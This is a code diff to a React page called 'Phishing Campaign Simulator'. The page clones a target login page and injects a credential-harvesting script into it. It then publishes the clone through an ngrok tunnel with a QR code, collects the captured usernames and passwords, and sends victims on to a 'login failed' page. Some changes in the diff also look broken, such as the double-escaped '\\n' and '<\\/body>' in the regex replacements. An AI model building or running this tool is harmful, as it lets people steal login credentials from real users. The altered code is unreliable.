@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, useEffect, useRef } from 'react';
@@ -194,14 +195,14 @@ export default function PhishingPage() {
 
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
+          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
         } else {
           html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
       }
 
       if (html.includes('</body>')) {
-        html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
+        html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
       } else {
         html += harvesterScript;
       }
@@ -230,7 +231,7 @@ export default function PhishingPage() {
       await startNgrokTunnel();
 
       const pageId = generateUUID();
-      const pageStorageKey = 'phishing-html-' + pageId;
+      const pageStorageKey = `phishing-html-${pageId}`;
       localStorage.setItem(pageStorageKey, modifiedHtml);
 
       pollIntervalRef.current = setInterval(async () => {
@@ -266,43 +267,142 @@ export default function PhishingPage() {
     }
   };
 
-  const fallbackCopyTextToClipboard = (text: string) => {
-    const textArea = document.createElement("textarea");
-    textArea.value = text;
-    textArea.style.position = "fixed";
-    textArea.style.opacity = "0";
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand("copy");
-    document.body.removeChild(textArea);
-  };
-
   const handleCopyUrl = () => {
     if (hostedUrl) {
-      try {
-        navigator.clipboard.writeText(hostedUrl);
-      } catch {
-        fallbackCopyTextToClipboard(hostedUrl);
-      }
+      navigator.clipboard.writeText(hostedUrl);
       toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
     }
   };
 
   const handleCopyHtml = () => {
     if (modifiedHtml) {
-      try {
-        navigator.clipboard.writeText(modifiedHtml);
-      } catch {
-        fallbackCopyTextToClipboard(modifiedHtml);
-      }
+      navigator.clipboard.writeText(modifiedHtml);
       toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
     }
   };
 
   return (
     <div className="flex flex-col gap-6">
-      {/* <!-- Your original return JSX remains unchanged --> */}
-      {/* Add your JSX form, tabs, buttons, QR and CredentialHarvester here */}
+      <div>
+        <h1 className="font-headline text-3xl font-semibold">Phishing Campaign Simulator</h1>
+        <p className="text-muted-foreground">Clone login pages and manage credential harvesting campaigns.</p>
+      </div>
+      
+      <div className="grid lg:grid-cols-2 gap-6 items-start">
+        <div className="flex flex-col gap-6">
+            <Card>
+                <CardHeader>
+                <CardTitle>1. Page Cloner</CardTitle>
+                <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
+                </CardHeader>
+                <Form {...form}>
+                <form onSubmit={form.handleSubmit(processAndInject)}>
+                    <CardContent className="space-y-4">
+                    <Tabs defaultValue="url" className="w-full">
+                        <TabsList className="grid w-full grid-cols-2">
+                        <TabsTrigger value="url">Clone from URL</TabsTrigger>
+                        <TabsTrigger value="html">Paste HTML</TabsTrigger>
+                        </TabsList>
+                        <TabsContent value="url" className="mt-4">
+                        <FormField
+                            control={form.control}
+                            name="urlToClone"
+                            render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>Target Page URL</FormLabel>
+                                <FormControl>
+                                <Input placeholder="https://example.com/login" {...field} value={field.value ?? ''} />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                            )}
+                        />
+                        </TabsContent>
+                        <TabsContent value="html" className="mt-4">
+                        <FormField
+                            control={form.control}
+                            name="htmlContent"
+                            render={({ field }) => (
+                            <FormItem>
+                                <FormLabel>HTML Source Code</FormLabel>
+                                <FormControl>
+                                <Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" />
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                            )}
+                        />
+                        </TabsContent>
+                    </Tabs>
+                    <FormField
+                        control={form.control}
+                        name="redirectUrl"
+                        render={({ field }) => (
+                        <FormItem>
+                            <FormLabel>Redirect URL (after capture)</FormLabel>
+                            <FormControl>
+                            <Input placeholder="https://example.com/login_failed" {...field} />
+                            </FormControl>
+                            <FormMessage />
+                        </FormItem>
+                        )}
+                    />
+                    <Button type="submit" className="w-full" disabled={isProcessing}>
+                        {isProcessing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
+                        Process HTML
+                    </Button>
+                    </CardContent>
+                    {modifiedHtml && (
+                    <CardFooter className="flex-col items-start gap-4">
+                        <CardTitle className="text-xl">2. Generate Public Link</CardTitle>
+                        <div className="w-full flex gap-2">
+                        <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
+                           {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
+                           Generate Public Link (ngrok)
+                        </Button>
+                        <Button type="button" variant="secondary" onClick={handleCopyHtml}>
+                            <Clipboard className="mr-2 h-4 w-4" />
+                            Copy HTML
+                        </Button>
+                        </div>
+                        <Button type="button" onClick={resetState} variant="destructive" className="w-full">
+                        <StopCircle className="mr-2 h-4 w-4" /> Reset
+                        </Button>
+                    </CardFooter>
+                    )}
+                </form>
+                </Form>
+            </Card>
+          
+          {hostedUrl && (
+             <Card>
+               <CardHeader>
+                 <CardTitle>Hosted Page URL</CardTitle>
+                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
+               </CardHeader>
+               <CardContent className="space-y-4">
+                 <div className="flex w-full items-center gap-2">
+                   <Input readOnly value={hostedUrl} className="font-mono" />
+                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                     <Clipboard className="h-4 w-4" />
+                   </Button>
+                 </div>
+                 <div className="flex justify-center">
+                   <QrCodeGenerator url={hostedUrl} />
+                 </div>
+               </CardContent>
+             </Card>
+           )}
+        </div>
+        
+        <div className="flex flex-col gap-6">
+          <CredentialHarvester 
+            credentials={capturedCredentials} 
+            onClear={handleClearCredentials} 
+            onRefresh={loadCredentialsFromStorage} 
+          />
+        </div>
+      </div>
     </div>
   );
 }
